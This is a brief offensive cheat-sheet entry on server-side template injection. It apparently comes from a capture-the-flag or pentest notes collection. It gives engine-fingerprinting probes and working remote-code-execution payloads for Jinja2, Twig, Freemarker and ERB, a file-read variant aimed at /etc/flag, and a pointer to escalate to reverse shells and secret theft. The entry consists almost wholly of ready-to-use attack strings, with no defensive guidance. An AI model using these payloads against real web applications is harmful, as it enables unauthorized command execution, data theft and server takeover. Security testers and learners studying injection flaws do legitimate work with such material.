## SSTI — Server-Side Template Injection -> RCE
Where: name fields, email/PDF/report templates, subject lines, any reflected value rendered by a template engine.
Detect/fingerprint: `${7*7}` and `{{7*7}}` and `<%= 7*7 %>` and `#{7*7}` -> whichever returns `49` names the engine. `{{7*'7'}}` -> `7777777` (Jinja2/Twig) vs `49` (others).
Jinja2 (Python/Flask) RCE: `{{ cycler.__init__.__globals__.os.popen('id').read() }}` or `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` or `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`.
Twig (PHP): `{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}`.
Freemarker (Java): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
Velocity, Smarty, ERB (`<%= system('id') %>`), Handlebars, Pug — each has a known escape.
Escalate: RCE -> read flag/secrets, reverse shell. Read a file: swap `popen('id')` for `open('/etc/flag').read()` (Jinja2).
